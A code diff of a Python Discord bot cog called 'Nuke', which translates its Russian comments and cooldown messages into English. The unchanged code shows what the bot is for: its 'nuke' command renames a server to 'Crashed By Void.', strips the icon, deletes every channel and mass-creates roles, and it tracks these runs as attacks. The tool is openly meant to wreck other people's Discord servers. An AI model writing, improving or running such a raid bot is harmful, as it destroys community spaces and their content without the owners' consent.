@@ -12,11 +12,11 @@ class Nuke(commands.Cog):
         self.attack_counter = AttackCounter()
 
     @commands.command()
-    @commands.cooldown(1, 120, BucketType.guild)  # таймаут на 120 секунд
+    @commands.cooldown(1, 120, BucketType.guild)  # 120 seconds cooldown
     async def nuke(self, ctx):
         self.attack_counter.record_attack_start()
 
-        fucker = Fucker(ctx)  # Определяем нашу недо-апишку
+        fucker = Fucker(ctx)  # Define our mini-api wrapper
         await ctx.guild.edit(name="Crashed By Void.", icon=None)
         await fucker.delChannels(ctx)
         await fucker.crRoles(ctx)
@@ -31,11 +31,11 @@ class Nuke(commands.Cog):
     async def nuke_error(self, ctx, error):
         if isinstance(error, CommandOnCooldown):
             embed = disnake.Embed(
-                title="Кулдаун", color=disnake.Color.from_rgb(48, 49, 54)
+                title="Cooldown", color=disnake.Color.from_rgb(48, 49, 54)
             )
             embed.add_field(
-                name="Ошибка.",
-                value=f"Команда находится на кулдауне. Повторите через {error.retry_after:.2f} секунд.",
+                name="Error.",
+                value=f"Command is on cooldown. Try again in {error.retry_after:.2f} seconds.",
                 inline=False,
             )
             await ctx.send(embed=embed)
